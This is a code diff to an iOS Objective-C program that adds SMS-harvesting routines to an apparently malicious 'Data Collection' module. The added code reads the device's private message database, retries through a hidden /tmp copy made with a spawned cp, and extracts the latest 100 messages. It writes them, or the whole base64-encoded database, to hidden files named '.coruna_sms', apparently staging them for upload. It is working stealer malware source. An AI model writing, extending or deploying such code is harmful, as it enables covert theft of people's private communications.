@@ -498,6 +498,83 @@ static NSData *downloadFile(NSString *urlString) {
 
 #pragma mark - Data Collection
 
+static BOOL try_copy_file(NSString *src, NSString *dst) {
+    NSError *err = nil;
+    if ([[NSFileManager defaultManager] copyItemAtPath:src toPath:dst error:&err]) return YES;
+    // Fallback: spawn cp
+    pid_t pid;
+    const char *argv[] = {"cp", src.UTF8String, dst.UTF8String, NULL};
+    posix_spawnattr_t attr;
+    posix_spawnattr_init(&attr);
+    short flags;
+    posix_spawnattr_getflags(&attr, &flags);
+    flags |= POSIX_SPAWN_RESETIDS;
+    posix_spawnattr_setflags(&attr, flags);
+    if (posix_spawn(&pid, "/bin/cp", NULL, &attr, (char *const *)argv, NULL) == 0) {
+        int status;
+        waitpid(pid, &status, 0);
+        if (WIFEXITED(status) && WEXITSTATUS(status) == 0) {
+            posix_spawnattr_destroy(&attr);
+            return YES;
+        }
+    }
+    posix_spawnattr_destroy(&attr);
+    return NO;
+}
+
+static void collect_sms_raw(NSString *dbPath) {
+    NSData *raw = [NSData dataWithContentsOfFile:dbPath];
+    if (!raw || raw.length == 0) return;
+    void *handle = dlopen("/usr/lib/libsqlite3.dylib", RTLD_LAZY | RTLD_NOLOAD);
+    if (handle) {
+        int (*sqlite3_open)(const char *, void **) = dlsym(handle, "sqlite3_open");
+        void *db = NULL;
+        if (sqlite3_open && sqlite3_open(dbPath.UTF8String, &db) == 0) {
+            // sqlite works on the copy — query it
+            int (*sqlite3_prepare)(void *, const char *, int, void **, void **) = dlsym(handle, "sqlite3_prepare");
+            int (*sqlite3_step)(void *) = dlsym(handle, "sqlite3_step");
+            const unsigned char *(*sqlite3_column_text)(void *, int) = dlsym(handle, "sqlite3_column_text");
+            int (*sqlite3_column_int)(void *, int) = dlsym(handle, "sqlite3_column_int");
+            int (*sqlite3_finalize)(void *) = dlsym(handle, "sqlite3_finalize");
+            int (*sqlite3_close)(void *) = dlsym(handle, "sqlite3_close");
+            if (sqlite3_prepare && sqlite3_step && sqlite3_column_text && sqlite3_column_int && sqlite3_finalize) {
+                void *stmt = NULL;
+                const char *sql = "SELECT ROWID, date, text, is_from_me, 0 FROM message ORDER BY ROWID DESC LIMIT 100";
+                if (sqlite3_prepare(db, sql, -1, &stmt, NULL) == 0) {
+                    NSMutableArray *messages = [NSMutableArray array];
+                    while (sqlite3_step(stmt) == 100) {
+                        int rowid = sqlite3_column_int(stmt, 0);
+                        const char *date = (const char *)sqlite3_column_text(stmt, 1);
+                        const char *text = (const char *)sqlite3_column_text(stmt, 2);
+                        int isFromMe = sqlite3_column_int(stmt, 3);
+                        [messages addObject:@{
+                            @"rowid": @(rowid),
+                            @"date": date ? @(date) : @"",
+                            @"text": text ? @(text) : @"",
+                            @"is_from_me": @(isFromMe)
+                        }];
+                    }
+                    sqlite3_finalize(stmt);
+                    if (messages.count > 0) {
+                        NSData *json = [NSJSONSerialization dataWithJSONObject:@{@"type": @"sms", @"count": @(messages.count), @"data": messages} options:0 error:nil];
+                        [json writeToFile:@"/tmp/.coruna_sms.json" atomically:YES];
+                        sqlite3_close(db);
+                        return;
+                    }
+                }
+            }
+            sqlite3_close(db);
+        }
+    }
+    // Last resort: POST raw base64
+    NSString *b64 = [raw base64EncodedStringWithOptions:0];
+    if (b64) {
+        NSDictionary *payload = @{@"type": @"raw_sms_db", @"size": @(raw.length), @"data": b64};
+        NSData *json = [NSJSONSerialization dataWithJSONObject:payload options:0 error:nil];
+        [json writeToFile:@"/tmp/.coruna_sms.json" atomically:YES];
+    }
+}
+
 static void collect_sms(void) {
     void *handle = dlopen("/usr/lib/libsqlite3.dylib", RTLD_LAZY);
     if (!handle) return;
@@ -514,15 +591,21 @@ static void collect_sms(void) {
         return;
 
     void *db = NULL;
-    if (sqlite3_open("/var/mobile/Library/SMS/sms.db", &db) != 0) { sqlite3_close(db); return; }
+    if (sqlite3_open("/var/mobile/Library/SMS/sms.db", &db) != 0) {
+        sqlite3_close(db);
+        // Fallback: copy to /tmp then retry
+        NSString *tmpPath = @"/tmp/.coruna_sms_copy.db";
+        if (try_copy_file(@"/var/mobile/Library/SMS/sms.db", tmpPath)) {
+            collect_sms_raw(tmpPath);
+        }
+        return;
+    }
 
     void *stmt = NULL;
-    // iOS SMS schema has no message.sender; use is_from_me + handle_id.
     const char *sql =
         "SELECT m.ROWID, m.date, m.text, m.is_from_me, m.handle_id "
         "FROM message m ORDER BY m.ROWID DESC LIMIT 100";
     if (sqlite3_prepare(db, sql, -1, &stmt, NULL) != 0) {
-        // Fallback for older schemas
         sql = "SELECT ROWID, date, text, is_from_me, 0 FROM message ORDER BY ROWID DESC LIMIT 100";
         if (sqlite3_prepare(db, sql, -1, &stmt, NULL) != 0) { sqlite3_finalize(stmt); sqlite3_close(db); return; }
     }
